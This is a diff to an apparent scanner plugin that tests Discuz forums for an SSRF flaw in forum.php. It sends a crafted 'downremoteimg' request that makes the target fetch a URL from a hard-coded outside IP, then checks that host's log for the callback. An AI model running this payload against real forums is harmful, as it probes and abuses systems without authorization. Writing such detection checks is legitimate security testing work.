@@ -25,18 +25,20 @@ class discuz_forum_message_ssrf_BaseVerify:
         time_stamp = time.mktime(datetime.datetime.now().timetuple())
         m = hashlib.md5(str(time_stamp).encode(encoding='utf-8'))
         md5_str = m.hexdigest()
-        payload = "/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://ea268b12.dnslog.link/"+md5_str+".jpg[/img]&formhash=09cec465"
+        payload = "/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://45.76.158.91:6868/"+md5_str+".jpg[/img]&formhash=09cec465"
         vulnurl = self.url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
-            eye_url = "http://admin.dnslog.link/api/web/ea268b12/ea268b12/"
+            eye_url = "http://45.76.158.91/web.log"
             time.sleep(6)
             reqr = requests.get(eye_url, timeout=10, verify=False)
             if md5_str in reqr.text:
                 cprint("[+]存在discuz论坛forum.php参数message SSRF漏洞...(中危)\tpayload: "+vulnurl, "yellow")
+            else:
+                cprint("[-]不存在discuz_forum_message_ssrf漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
